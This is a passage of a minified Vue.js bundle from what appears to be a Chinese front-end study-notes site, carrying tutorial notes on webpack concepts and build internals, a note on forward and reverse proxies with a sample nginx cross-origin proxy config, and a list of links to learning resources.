JavaScript）")])]),t("li",[t("p",[n._v("配置")]),t("ul",[t("li",[n._v("test：用于标识出应该被对应的 loader 进行转换的某个或某些文件")]),t("li",[n._v("use : 表示进行转换时，应该使用哪个 loader")])])]),t("li",[t("p",[n._v("常见使用场景")]),t("ul",[t("li",[t("p",[n._v("加载 CSS")]),t("ul",[t("li",[t("p",[n._v("style-loader")]),t("ul",[t("li",[n._v("将所有的样式嵌入到dom的style属性当中")])])]),t("li",[t("p",[n._v("css-loader")]),t("ul",[t("li",[n._v("将css当中的 @import 和 url(...) 解析成 import / require 引入")])])]),t("li",[t("p",[n._v("sass-loader")]),t("ul",[t("li",[n._v("将代码sass编译成css")])])])])]),t("li",[t("p",[n._v("加载图片/字体")]),t("ul",[t("li",[n._v("file-loader")])])]),t("li",[t("p",[n._v("加载数据文件（(JSON, CSV, TSV, XML）")]),t("ul",[t("li",[n._v("csv-loader（csv|tsv）")]),t("li",[n._v("xml-loader（xml）")])])])])])]),t("h3",[n._v("plugins")]),t("ul",[t("li",[t("p",[n._v("作用：插件的范围包括，从打包优化和压缩，一直到重新定义环境中的变量。插件接口功能极其强大，可以用来处理各种各样的任务。")])]),t("li",[t("p",[n._v("配置")]),t("ul",[t("li",[t("p",[n._v("plugins：想使用一个插件，你只需要 require() 它，然后把它添加到 plugins 数组中")]),t("ul",[t("li",[n._v("new : 通过new操作符来创建一个插件的实例  如 ： new HtmlWebpackPlugin({template: './src/index.html'})")]),t("li",[n._v("option : 多数插件可以通过选项(option)来自定义   如：new webpack.optimize.UglifyJsPlugin()")])])])])])]),t("h3",[n._v("mode")]),t("ul",[t("li",[t("p",[n._v("作用：设置mode参数，来启用相应模式下的webpack内置的优化")])]),t("li",[t("p",[n._v("配置")]),t("ul",[t("li",[n._v("development")]),t("li",[n._v("production")])])])]),t("h3",[n._v("devtool")]),t("ul",[t("li",[t("p",[n._v("常见使用场景")]),t("ul",[t("li",[t("p",[n._v("找到报错源文件的位置")]),t("ul",[t("li",[n._v("inline-source-map")])])]),t("li",[t("p",[n._v("webpack自动重新编译修改后的模块,但是要手动刷新页面")]),t("ul",[t("li",[n._v("webpack --watch")])])]),t("li",[t("p",[n._v("实时重新加载(live reloading)")]),t("ul",[t("li",[n._v("webpack-dev-server")])])])])])]),t("h3",[n._v("devServer")]),t("h2",[n._v("Webpack核心概念")]),t("h3",[n._v("核心概念")]),t("ul",[t("li",[t("p",[n._v("Webpack 启动后会从 Entry 里配置的 Module 开始递归解析 Entry 依赖的所有 Module。 每找到一个 Module， 就会根据配置的Loader去找出对应的转换规则，对 Module 进行转换后，再解析出当前 Module 依赖的 Module。 这些模块会以 Entry 为单位进行分组，一个 Entry 和其所有依赖的 Module 被分到一个组也就是一个 Chunk。最后 Webpack 会把所有 Chunk 转换成文件输出。 在整个流程中 Webpack 会在恰当的时机执行 Plugin 里定义的逻辑。")])]),t("li",[t("p",[n._v("Entry")]),t("ul",[t("li",[n._v("入口，webpack执行构建的第一步将从Entry开始，可抽象理解为输入")])])]),t("li",[t("p",[n._v("Module")]),t("ul",[t("li",[n._v("模块，在webpacl中一切皆为模块，一个模块对应一个文件，webpack会从配置的Entry开始递归找出所有依赖的模块")])])]),t("li",[t("p",[n._v("Chunk")]),t("ul",[t("li",[n._v("代码块，一个chunk由多个模块组合而成，用于将代码合并和分割")])])]),t("li",[t("p",[n._v("Loader")]),t("ul",[t("li",[n._v("模块转换器，用于把模块原内容按照需求转换为需要的新内容")])])]),t("li",[t("p",[n._v("Plugin")]),t("ul",[t("li",[n._v("扩展插件，在webpack构建流程中的特定时机注入扩展逻辑来改变构建结果和想要做的事情")])])]),t("li",[t("p",[n._v("Output")]),t("ul",[t("li",[n._v("输入结果，在webpack经过一系列处理并得到最终想要的代码然后输出结果")])])])]),t("h3",[n._v("详细拆分")]),t("ul",[t("li",[t("p",[n._v("1.Entry")]),t("ul",[t("li",[t("p",[n._v("context")]),t("ul",[t("li",[n._v("用来解决配置文件和入口文件不再同一层结构，列如我们配置文件在config，入口文件在根目录，则如下配置")])])]),t("li",[t("p",[n._v("单页面(SPA)Entry入口")]),t("ul",[t("li",[n._v("最简单的单页面(SPA)Entry入口，将main.js引入，并根据main.js中引用和依赖的模块开始解析")])])]),t("li",[t("p",[n._v("多页面(MPA)Entry入口")]),t("ul",[t("li",[n._v("多页面(MPA)Entry入口，将多个文件引入，当然一般是读取指定文件夹内的入口文件，然后引入")]),t("li",[n._v("如果是单页面(传入的是字符串或字符串数组)，则chunk会被命名为main，如果是多页面(传入一个对象)，则每个键(key)会是chunk的名称，描述了chunk的入口起点")])])])])]),t("li",[t("p",[n._v("2.Output")]),t("ul",[t("li",[t("p",[n._v("初步了解")]),t("ul",[t("li",[n._v("Object类型， 指示webpack如何去输出，以及在哪里输出你的bundle、asset 和其他你所打包或使用 webpack 载入的任何内容")])])]),t("li",[t("p",[n._v("path")]),t("ul",[t("li",[n._v("输出目录对应一个绝对路径")])])]),t("li",[t("p",[n._v("pathinfo")]),t("ul",[t("li",[n._v("boolean类型， 默认false，作用是告诉webpack在bundle中引入所包含模块信息的相关注释，不应用于生产环境(production)，对开发环境(development)极其有用")])])]),t("li",[t("p",[n._v("publicPath")]),t("ul",[t("li",[n._v("主要作用是针对打包后的文件里面的静态文件路径处理")])])]),t("li",[t("p",[n._v("filename")]),t("ul",[t("li",[t("p",[n._v("定义每个输出bundle的名称，这些bundle将写入output.path选项指定的目录下")])]),t("li",[t("p",[n._v("（1）单入口")]),t("ul",[t("li",[n._v("对于单入口Entry，filename是一个静态名称")])])]),t("li",[t("p",[n._v("（2）多入口")]),t("ul",[t("li",[n._v("但是在webpack中我们会用到代码拆分、各种插件plugin或多入口Entry创建多个bundle，这样我们就应该给每个bundle一个唯一的名称")])])]),t("li",[t("p",[n._v("（3）使用内部chunk id")])]),t("li",[t("p",[n._v("（4）唯一hash生成")])]),t("li",[t("p",[n._v("（5）使用基于每个 chunk 内容的 hash")])])])])])]),t("li",[t("p",[n._v("3.Module模块")]),t("ul",[t("li",[t("p",[n._v("初步了解")]),t("ul",[t("li",[n._v("处理项目中应用的不同模块，主要配置皆在Rules中，匹配到请求的规则数组，这些规则能够对模块应用loader，或者修改解析器parser")])])]),t("li",[t("p",[n._v("Module.noParse")]),t("ul",[t("li",[n._v("防止webpack解析的时候，将规则匹配成功的文件进行解析和忽略大型的library来对性能的优化，在被忽略的文件中不应该含有import、require和define的调用")])])]),t("li",[t("p",[n._v("Rules")]),t("ul",[t("li",[t("p",[n._v("创建模块时，匹配请求的规则数组")])]),t("li",[t("p",[n._v("Rule条件")]),t("ul",[t("li",[t("p",[n._v("resource(请求文件的绝对路径)、issuer(被请求资源的模块文件的绝对路径，导入时的位置)，比如一个文件A导入文件B，resource是/B，issuer是/A是导入文件时的位置，而不是真正的位置，在规则中，test/include/exclude/resource对resource匹配，而issuer只对issuer匹配")])]),t("li",[t("p",[n._v("Test/include/exclude/resource/issuer的用法和区别")]),t("ul",[t("li",[n._v("代码")]),t("li",[n._v("test：一般是提供一个正则表达式或正则表达式的数组，绝对路径符合这个正则的则意味着满足这个条件")]),t("li",[n._v("include：是一个字符串或者字符串数组，指定目录中的文件需要走这个规则")]),t("li",[n._v("exclude：同样是一个字符串或者字符串数组，指定目录中的文件不需要走这个规则")]),t("li",[n._v("resource：就是对text/include/exclude的一个对象包装，和他们单独写没有区别")]),t("li",[n._v("issuer：和resource有异曲同工的作用，不过区别在于它是将这个rule应用于哪个文件以及这个文件所导入的所有依赖文件")])])])])]),t("li",[t("p",[n._v("额外选项")]),t("ul",[t("li",[t("p",[n._v("resourceQuery")]),t("ul",[t("li",[n._v("和resource用法一样，不过针对的是匹配结果'?'后面的路径参数，可以调用resource中的text等")])])]),t("li",[t("p",[n._v("oneOf")]),t("ul",[t("li",[n._v("表示对该资源只应用第一个匹配的规则，一般结合resourceQuery")]),t("li",[n._v("path/to/foo.png?inline: 会匹配url-loader")]),t("li",[n._v("path/to/foo.png?other:会匹配file-loader")]),t("li",[n._v("path/to/foo.png: 会匹配file-loader")])])]),t("li",[t("p",[n._v("useEntry")]),t("ul",[t("li",[n._v("object类型，包含着每一个loader并且对应loader的配置文件")]),t("li",[n._v("options会传入loader，可以理解为loader的选项")])])]),t("li",[t("p",[n._v("use")]),t("ul",[t("li",[n._v("是对useEntry的集合，并且对每一个入口指定使用一个loader")])])])])])])])])]),t("li",[t("p",[n._v("4.Resolve解析")]),t("ul",[t("li",[t("p",[n._v("初步了解")]),t("ul",[t("li",[n._v("主要用来模块如何被解析，给webpack提供默认值")])])]),t("li",[t("p",[n._v("alias")]),t("ul",[t("li",[n._v("object类型，主要用来让import和require调用更方便，设置初始路径")])])]),t("li",[t("p",[n._v("enforceExtension")]),t("ul",[t("li",[n._v("Boolean类型， 默认false，表示引用不需要扩展名，为true时，import、require中引用必须加扩展名")])])]),t("li",[t("p",[n._v("extensions")]),t("ul",[t("li",[n._v("Array 自动解析不需要扩展名")])])]),t("li",[t("p",[n._v("modules")]),t("ul",[t("li",[n._v("Array webpack解析模块的时候需要搜索的目录，一般用于优先搜索和非node_modules文件中的自定义模块")])])])])]),t("li",[t("p",[n._v("5.Loader")]),t("ul",[t("li",[t("p",[n._v("概述")]),t("ul",[t("li",[n._v("通过使用不同的Loader，Webpack可以要把不同的文件都转成JS文件,比如CSS、ES6/7、JSX等，一般用于module的use中")])])])])]),t("li",[t("p",[n._v("6.Plugin插件")]),t("ul",[t("li",[n._v("Array 扩展webpack，在webpack构建流程中的特定时机注入扩展逻辑来改变构建结果和想要做的事情")])])]),t("li",[t("p",[n._v("7.webpack-dev-server")]),t("ul",[t("li",[n._v("开发中的server，webpack-dev-server可以快速搭建起本地服务，具体使用查看 webpack-dev-server")])])]),t("li",[t("p",[n._v("8.Devtool")]),t("ul",[t("li",[n._v("此选项控制是否生成，以及如何生成，官方推荐 SourceMapDevToolPlugin 和 source-map-loader 建议看官方文档 Devtool 主要用来控制打包品质和在dev环境的调试便捷度和编译的快慢")])])]),t("li",[t("p",[n._v("9.Watch")]),t("ul",[t("li",[n._v("webpack 可以监听文件变化，当它们修改后会重新编译和 HotModuleReplacementPlugin 有相似之处，监听文件变动热启动")])])])]),t("h2",[n._v("Webpack深入执行原理")]),t("h3",[n._v("（1）Webpack运行机制")]),t("ul",[t("li",[t("p",[n._v("运行过程")]),t("ul",[t("li",[n._v("初始化配置参数 -> 绑定事件钩子回调 -> 确定Entry逐一遍历 -> 使用loader编译文件 -> 输出文件")])])]),t("li",[t("p",[n._v("Webpack事件流")]),t("ul",[t("li",[t("p",[n._v("生产线")]),t("ul",[t("li",[n._v("Webpack 通过 Tapable 来组织这条复杂的生产线。 Webpack 在运行过程中会广播事件，插件只需要监听它所关心的事件，就能加入到这条生产线中，去改变生产线的运作。 Webpack 的事件流机制保证了插件的有序性，使得整个系统扩展性很好。")]),t("li",[n._v("Webpack 就像一条生产线，要经过一系列处理流程后才能将源文件转换成输出结果。 这条生产线上的每个处理流程的职责都是单一的，多个流程之间有存在依赖关系，只有完成当前处理后才能交给下一个流程去处理。 插件就像是一个插入到生产线中的一个功能，在特定的时机对生产线上的资源做处理。")])])]),t("li",[t("p",[n._v("事件流")]),t("ul",[t("li",[n._v("我们将webpack事件流理解为webpack构建过程中的一系列事件，他们分别表示着不同的构建周期和状态，我们可以像在浏览器上监听click事件一样监听事件流上的事件，并且为它们挂载事件回调。我们也可以自定义事件并在合适时机进行广播，这一切都是使用了webpack自带的模块 Tapable 进行管理的。我们不需要自行安装 Tapable ，在webpack被安装的同时它也会一并被安装，如需使用，我们只需要在文件里直接 require 即可。")])])]),t("li",[t("p",[n._v("Tapable")]),t("ul",[t("li",[n._v("Tapable的原理其实就是我们在前端进阶过程中都会经历的EventEmit，通过发布者-订阅者模式实现")])])])])]),t("li",[t("p",[n._v("Webpack运行流程详解")]),t("ul",[t("li",[t("p",[n._v("总结图")])]),t("li",[t("p",[n._v("（1）初始化参数，绑定回调")]),t("ul",[t("li",[n._v("首先，webpack会读取你在命令行传入的配置以及项目里的 webpack.config.js 文件，初始化本次构建的配置参数，并且执行配置文件中的插件实例化语句，生成Compiler传入plugin的apply方法，为webpack事件流挂上自定义钩子。")])])]),t("li",[t("p",[n._v("（2）遍历入口")]),t("ul",[t("li",[n._v("webpack开始读取配置的Entries，递归遍历所有的入口文件")])])]),t("li",[t("p",[n._v("（3）使用loader编译文件")]),t("ul",[t("li",[n._v("Webpack进入其中一个入口文件，开始compilation过程。先使用用户配置好的loader对文件内容进行编译（buildModule），我们可以从传入事件回调的compilation上拿到module的resource（资源路径）、loaders（经过的loaders）等信息；之后，再将编译好的文件内容使用acorn解析生成AST静态语法树（normalModuleLoader），分析文件的依赖关系逐个拉取依赖模块并重复上述过程，最后将所有模块中的require语法替换成"),t("strong",[n._v("webpack_require")]),n._v("来模拟模块化操作。")])])]),t("li",[t("p",[n._v("（4）输出文件")]),t("ul",[t("li",[n._v("emit阶段，所有文件的编译及转化都已经完成，包含了最终输出的资源，我们可以在传入事件回调的compilation.assets 上拿到所需数据，其中包括即将输出的资源、代码块Chunk等等信息。")])])]),t("li",[t("p",[n._v("【AST】什么是AST？")]),t("ul",[t("li",[t("p",[n._v("定义")]),t("ul",[t("li",[n._v("是源代码语法结构的一种抽象表示。它以树状的形式表现编程语言的语法结构，树上的每个节点都表示源代码中的一种结构。之所以说语法是“抽象”的，是因为这里的语法并不会表示出真实语法中出现的每个细节。比如，嵌套括号被隐含在树的结构中，并没有以节点的形式呈现；而类似于 if-condition-then 这样的条件跳转语句，可以使用带有两个分支的节点来表示。")])])]),t("li",[t("p",[n._v("例子")])]),t("li",[t("p",[n._v("目的")]),t("ul",[t("li",[n._v("转换成AST的目的就是将我们书写的字符串文件转换成计算机更容易识别的数据结构，这样更容易提取其中的关键信息，而这棵树在计算机上的表现形式，其实就是一个单纯的Object。")])])]),t("li",[t("p",[n._v("计算机眼中的语句")]),t("ul",[t("li",[n._v("示例是一个简单的声明赋值语句，经过AST转化后各部分内容的含义就更为清晰明了了。")])])])])])])]),t("li",[t("p",[n._v("webpack输出结果解析")]),t("ul",[t("li",[t("p",[n._v("未设置splitChuck")]),t("ul",[t("li",[n._v("如果我们没有设置splitChunk，我们只会在dist目录下看到一个main.js输出文件，过滤掉没用的注释还有一些目前不需要去考虑的Funciton，得到的代码大概是这样")]),t("li",[n._v("我们都知道其实webpack在浏览器实现模块化的本质就是将所有的代码都注入到同一个JS文件里，现在我们可以清晰明了地看出webpack最后生成的也不过只是一个IIFE，我们引入的所有模块都被一个function给包起来组装成一个对象，这个对象作为IIFE的实参被传递进去。")])])]),t("li",[t("p",[n._v("设置splitChuck")]),t("ul",[t("li",[n._v("如果我们配置了splitChunk，这时候输出的文件就和你的Chunk挂钩了")]),t("li",[n._v("这时候，IIFE的形参也变成了摆设，所有我们的模块都被放在了一个名为 webpackJsonp 的全局数组上，通过IIFE里的 webpackJsonpCallback 来处理数据。")])])])])]),t("li",[t("p",[n._v("总结")]),t("ul",[t("li",[n._v("纵观webpack构建流程，我们可以发现整个构建过程主要花费时间的部分也就是递归遍历各个entry然后寻找依赖逐个编译的过程，每次递归都需要经历 String->AST->String 的流程，经过loader还需要处理一些字符串或者执行一些JS脚本，介于node.js单线程的壁垒，webpack构建慢一直成为它饱受诟病的原因。")]),t("li",[n._v("利用了node.js原生的cluster模块去开辟多进程执行构建，不过在4之后大家就可以不用去纠结这一问题了，多进程构建已经被集成在webpack本身上了，除了增量编译，这也是4之所以能大幅度提升构建效率的原因之一。")])])])]),t("h3",[n._v("（2）编写自定义webpack loader")]),t("ul",[t("li",[t("p",[n._v("在Webpack中起编译作用的是loader")]),t("ul",[t("li",[n._v("在你不知道loader的本质之前你一定会觉得这是个很高大上的东西，正如计算机学科里的编译原理一样，里面一定有许多繁杂的操作。但实际上，loader只是一个普通的funciton，他会传入匹配到的文件内容(String)，你只需要对这些字符串做些处理就好了。")])])]),t("li",[t("p",[n._v("一个最简单的loader实例")]),t("ul",[t("li",[t("p",[n._v("代码")])]),t("li",[t("p",[n._v("使用")]),t("ul",[t("li",[n._v("使用它的方式和babel-loader一样，只需要在webpack.config.js的module.rules数组里加上这么一个对象就好了")])])]),t("li",[t("p",[n._v("效果")]),t("ul",[t("li",[n._v("这样，loader会去匹配所有以.js后缀结尾的文件并在内容前追加{};这样一段代码，我们可以在输出文件中看到效果")]),t("li",[n._v("所以，拿到了文件内容，你想对字符串进行怎样得处理都由你自定义～你可以引入babel库加个 babel(content) ，这样就实现了编译，也可以引入uglifyjs对文件内容进行字符串压缩，一切工作都由你自己定义。")])])])])])]),t("h3",[n._v("（3）编写自定义webpack plugin")]),t("ul",[t("li",[t("p",[n._v("Webpack plugin起到的作用，就是为Webpack Hook事件挂载回调，或者执行指定脚本。它实际上和webpack loader一样简单，其实它只是一个带有apply方法的class。")])]),t("li",[t("p",[n._v("一个简单的plugin实例")]),t("ul",[t("li",[t("p",[n._v("代码")])]),t("li",[t("p",[n._v("使用")]),t("ul",[t("li",[n._v("只需要在webpack.config.js 里 require 并实例化就可以了")])])]),t("li",[t("p",[n._v("理解")]),t("ul",[t("li",[n._v("每次我们需要使用某个plugin的时候都需要new一下实例化，自然，实例过程中传递的参数，也就成为了我们的构造函数里拿到的options了")]),t("li",[n._v("而实例化所有plugin的时机，便是在webpack初始化所有参数的时候，也就是事件流开始的时候。所以，如果配合 shell.js 等工具库，我们就可以在这时候执行文件操作等相关脚本，这就是webpack plugin所做的事情。")]),t("li",[n._v("如果你想在指定时机执行某些脚本，自然可以使用在webpack事件流上挂载回调的方法，在回调里执行你所需的操作。")])])])])])])])}],co={},po=co,uo=Object(u["a"])(po,oo,lo,!1,null,"9a34df30",null),mo=uo.exports,go=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},bo=[],vo="# nginx\r\n\r\n## 正向代理与反向代理\r\n\r\n### 同域的要求\r\n\r\n- 1.协议相同\r\n- 2.域名相同\r\n- 3.端口相同\r\n\r\n### 正向代理与反向代理\r\n\r\n- 正向代理\r\n\r\n\t- 解释\r\n\r\n\t\t- 意思是一个位于客户端和目标服务器(target server)之间的服务器，为了从目标服务器取得内容，客户端向代理发送一个请求并指定目标(目标服务器)，然后代理向目标服务器转交请求并将获得的内容返回给客户端。\r\n\r\n\t- 通俗地说\r\n\r\n\t\t- 「客户端」可以看作一个黑社会大佬，「目标服务器」可以看作一家饭店，「代理服务器」可以看作小弟。\r\n\t\t- 「老大」想吃饭店的酱排骨饭，就让「小弟」去买，「小弟」跑到「饭店」要个酱排骨饭。\r\n\t\t- 「饭店」酱排骨饭做好，送到「小弟」手上，「小弟」最后再把酱排骨饭拿给「大佬」。\r\n\t\t- 说白了，小弟就是个跑腿的，代理大佬的需求。\r\n\r\n\t- 数据流程\r\n\r\n\t\t- 数据请求过程：浏览器 -> 代理服务器 -> 目标服务器\r\n\t\t- 数据返回过程：目标服务器 -> 代理服务器 -> 浏览器\r\n\r\n\t- 应用\r\n\r\n\t\t- 最经典的应用就是科学上网：我是一个国内用户，我访问不了google，但是我能访问一个香港的某个代理服务器。这个香港的代理服务器可以访问google，于是我先把请求发送到那个代理服务器，告诉他我需要访问google，代理服务器去取内容，最后返回给我。\r\n\r\n- 反向代理\r\n\r\n\t- 解释\r\n\r\n\t\t- 反向代理（Reverse Proxy）方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个反向代理服务器。\r\n\r\n\t- 数据流程\r\n\r\n\t\t- 数据请求过程：浏览器 ->【反向代理服务器 -> 处理数据的服务器】\r\n\t\t- 数据返回过程：【处理数据的服务器 -> 反向代理服务器】-> 浏览器\r\n\r\n\t- 通俗地说\r\n\r\n\t\t- 「浏览器」可以看作食客，「【反向代理服务器-》处理数据的服务器】」这一个整体可以看作饭店，其中「反向代理服务」相当于点单的服务员。「处理数据的服务器」可以理解为是厨师。\r\n\t\t- 「食客」向来到「饭店」向「服务员」点菜，但服务员并不会真正去做菜，他是下达命令让「厨师」去做菜。\r\n\t\t- 「厨师」把菜做好了给「服务员」，「服务员」再把菜端给「食客」。\r\n\t\t- 在外部看来，「代理服务器」和「处理数据的服务器」是一个整体。就好比，食客只会去饭店吃饭，而不是去找厨师吃饭（即对于浏览器来说，到达反向代理服务器已经完成任务了，后面的操作则由反向代理服务器负责）。具体饭店怎么操作，对食客是透明的。有可能某个服务员即当服务器也当厨师（即反向代理服务器和处理数据的服务器是同一台PC机）。\r\n\r\n- 比较\r\n\r\n\t- 从用途上来讲\r\n\r\n\t\t- 正向代理的典型用途是为在防火墙内的局域网客户端提供访问Internet的途径。正向代理还可以使用缓冲特性减少网络使用率。\r\n\t\t- 反向代理的典型用途是为后端的多台服务器提供负载平衡，或为后端较慢的服务器提供缓冲服务。\r\n\r\n\t- 从安全性来讲\r\n\r\n\t\t- 正向代理允许客户端通过它访问任意网站并且隐藏客户端自身，因此你必须采取安全措施以确保仅为经过授权的客户端提供服务。\r\n\t\t- 反向代理对外都是透明的，访问者并不知道自己访问的是一个代理。\r\n\r\n\t- 从使用方来看\r\n\r\n\t\t- 正向代理是浏览器端进行配置的，与服务器端无关，甚至可以对服务端隐藏。\r\n\t\t- 反向代理是服务器端配置的，对浏览器端是透明的。\r\n\r\n- 总结\r\n\r\n\t- 正向代理代理客户端，反向代理代理服务器\r\n\r\n### 利用代理实现跨域\r\n\r\n- 正向代理\r\n\r\n\t- 对正向代理服务器进行配置，当获取非接口数据时，让代理服务器指向开发者本机的资源。当访问接口时，访问后端接口数据。\r\n\t- Charles、Fiddler\r\n\r\n- 反向代理\r\n\r\n\t- Nginx\r\n\r\n\t\t- 用nginx反向代理实现跨域，是最简单的跨域方式。只需要修改nginx的配置即可解决跨域问题，支持所有浏览器，支持session，不需要修改任何代码，并且不会影响服务器性能。\r\n\t\t- 原理\r\n\r\n\t\t\t- 只需要配置nginx，在一个服务器上配置多个前缀来转发http/https请求到多个真实的服务器即可。这样，这个服务器上所有url都是相同的域名、协议和端口。因此，对于浏览器来说，这些url都是同源的，没有跨域限制。而实际上，这些url实际上由物理服务器提供服务。这些服务器内的javascript可以跨域调用所有这些服务器上的url。\r\n\r\n\t\t- 使用\r\n\r\n\t\t\t- server {\r\n        listen       9000;  #配置第一台服务器\r\n        server_name  localhost;\r\n\r\n        #charset koi8-r;\r\n\r\n        #access_log  logs/host.access.log  main;\r\n\r\n        location / {\r\n            #alias D:\\\\develop\\\\project1dir\\\\app\\\\; #配置别名到项目源代码目录，那么访问http://localhost:9000/即访问此目录\r\n            # Frontend Server\r\n            proxy_pass http://localhost:8001/;  #更聪明的做法是代理到前端服务器地址，比如gulp+browser-sync开启的服务器，能看到代码实时更新效果\r\n        }\r\n\r\n        location /api/ {\r\n            rewrite ^/api/(.*)$ /$1 break;   #所有对后端的请求加一个api前缀方便区分，真正访问的时候移除这个前缀\r\n            # API Server\r\n            proxy_pass http://www.serverA.com;  #将真正的请求代理到serverA,即真实的服务器地址，ajax的url为/api/user/1的请求将会访问http://www.serverA.com/user/1\r\n        }\r\n}\r\n",ho={data:function(){return{MainComponent:vo}}},So=ho,yo=Object(u["a"])(So,go,bo,!1,null,"d5606a0c",null),fo=yo.exports,_o=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},xo=[],wo={},Eo=wo,To=Object(u["a"])(Eo,_o,xo,!1,null,"6626a3a3",null),ko=To.exports,Co=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},jo=[],Mo={},Ro=Mo,Lo=Object(u["a"])(Ro,Co,jo,!1,null,"3c328ae4",null),Oo=Lo.exports,Ao=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},Io=[],Do={},Po=Do,No=Object(u["a"])(Po,Ao,Io,!1,null,"123e7225",null),qo=No.exports,Ho=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},Bo=[],Fo={},Uo=Fo,Jo=Object(u["a"])(Uo,Ho,Bo,!1,null,"2f6b4d34",null),zo=Jo.exports,Wo=function(){var n=this,r=n.$createElement;n._self._c;return n._m(0)},$o=[function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("p",[n._v("综合类")]),t("p",[n._v("综合类 地址")]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/sb19871023/p/3894452.html",target:"_blank"}},[n._v("前端知识体系")])]),t("p",[t("a",{attrs:{href:"https://github.com/JacksonTian/fks",target:"_blank"}},[n._v("前端知识结构")])]),t("p",[t("a",{attrs:{href:"https://github.com/unruledboy/WebFrontEndStack",target:"_blank"}},[n._v("Web前端开发大系概览")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/unruledboy/p/WebFrontEndStack.html",target:"_blank"}},[n._v("Web前端开发大系概览-中文版")])]),t("p",[n._v("Web Front-end Stack v2.2 Web Front-end Stack v2.2")]),t("p",[t("a",{attrs:{href:"https://github.com/justjavac/free-programming-books-zh_CN",target:"_blank"}},[n._v("免费的编程中文书籍索引")])]),t("p",[t("a",{attrs:{href:"https://github.com/dypsilon/frontend-dev-bookmarks",target:"_blank"}},[n._v("前端书籍")])]),t("p",[t("a",{attrs:{href:"https://github.com/vhf/free-programming-books",target:"_blank"}},[n._v("前端免费书籍大全")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/sb19871023/p/3894452.html",target:"_blank"}},[n._v("前端知识体系")])]),t("p",[t("a",{attrs:{href:"https://github.com/justjavac/free-programming-books-zh_CN",target:"_blank"}},[n._v("免费的编程中文书籍索引")])]),t("p",[t("a",{attrs:{href:"http://study.163.com/course/introduction/224014.htm",target:"_blank"}},[n._v("智能社 - 精通JavaScript开发")])]),t("p",[t("a",{attrs:{href:"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/A_re-introduction_to_JavaScript",target:"_blank"}},[n._v("重新介绍 JavaScript（JS 教程）")])]),t("p",[t("a",{attrs:{href:"http://v.163.com/special/opencourse/bianchengdaolun.html",target:"_blank"}},[n._v("麻省理工学院公开课：计算机科学及编程导论")])]),t("p",[t("a",{attrs:{href:"http://segmentfault.com/a/1190000002640298",target:"_blank"}},[n._v("JavaScript中的this陷阱的最全收集--没有之一")])]),t("p",[t("a",{attrs:{href:"https://llh911001.gitbooks.io/mostly-adequate-guide-chinese/content/ch1.html",target:"_blank"}},[n._v("JS函数式编程指南")])]),t("p",[t("a",{attrs:{href:"http://liubin.github.io/promises-book",target:"_blank"}},[n._v("JavaScript Promise迷你书（中文版）")])]),t("p",[t("a",{attrs:{href:"https://github.com/AlloyTeam/Mars",target:"_blank"}},[n._v("腾讯移动Web前端知识库")])]),t("p",[t("a",{attrs:{href:"https://github.com/Front-End-Developers-Hunan/Front-End-Develop-Guide",target:"_blank"}},[n._v("Front-End-Develop-Guide 前端开发指南")])]),t("p",[t("a",{attrs:{href:"https://li-xinyang.gitbooks.io/frontend-notebook/content",target:"_blank"}},[n._v("前端开发笔记本")])]),t("p",[t("a",{attrs:{href:"https://github.com/nieweidong/fetool",target:"_blank"}},[n._v("大前端工具集 - 聂微东")])]),t("p",[t("a",{attrs:{href:"https://dwqs.gitbooks.io/frontenddevhandbook/content",target:"_blank"}},[n._v("前端开发者手册")])]),t("p",[n._v("入门类")]),t("p",[n._v("入门类 地址")]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/jikey/p/3613082.html",target:"_blank"}},[n._v("前端入门教程")])]),t("p",[t("a",{attrs:{href:"http://www.liaoxuefeng.com/wiki/001434446689867b27157e896e74d51a89c25cc8b43bdb3000",target:"_blank"}},[n._v("瘳雪峰的Javascript教程")])]),t("p",[t("a",{attrs:{href:"http://www.imooc.com/view/11",target:"_blank"}},[n._v("jQuery基础教程")])]),t("p",[t("a",{attrs:{href:"http://www.imooc.com/view/506",target:"_blank"}},[n._v("前端工程师必备的PS技能——切图篇")])]),t("p",[t("a",{attrs:{href:"https://github.com/qiu-deqing/FE-learning",target:"_blank"}},[n._v("结合个人经历总结的前端入门方法")])]),t("p",[n._v("工具类")]),t("p",[n._v("工具类 地址")]),t("p",[t("a",{attrs:{href:"http://f2er.club/",target:"_blank"}},[n._v("前端人的俱乐部")])]),t("p",[t("a",{attrs:{href:"http://www.jeffjade.com/2015/12/15/2015-04-17-toss-sublime-text/#",target:"_blank"}},[n._v("如何优雅地使用Sublime\n                    Text")])]),t("p",[t("a",{attrs:{href:"http://www.jeffjade.com/2016/03/03/2016-03-02-how-to-use-atom/",target:"_blank"}},[n._v("新编码神器Atom使用纪要")])]),t("p",[t("a",{attrs:{href:"http://www.imooc.com/learn/93",target:"_blank"}},[n._v("css sprite 雪碧图制作")])]),t("p",[t("a",{attrs:{href:"http://www.imooc.com/learn/390",target:"_blank"}},[n._v("版本控制入门 – 搬进 Github")])]),t("p",[t("a",{attrs:{href:"http://www.imooc.com/learn/30",target:"_blank"}},[n._v("Grunt-beginner前端自动化工具")])]),t("p",[t("a",{attrs:{href:"https://github.com/judasn/IntelliJ-IDEA-Tutorial",target:"_blank"}},[n._v("IntelliJ IDEA 简体中文专题教程")])]),t("p",[t("a",{attrs:{href:"http://t.cn/8kZZ1Uy",target:"_blank"}},[n._v("Webstorm,InterllIdea,Phpstorm")])]),t("p",[t("a",{attrs:{href:"https://github.com/jikeytang/sublime-text",target:"_blank"}},[n._v("SublimeText")])]),t("p",[t("a",{attrs:{href:"https://atom.io",target:"_blank"}},[n._v("Atom")])]),t("p",[t("a",{attrs:{href:"https://code.visualstudio.com",target:"_blank"}},[n._v("visual studio 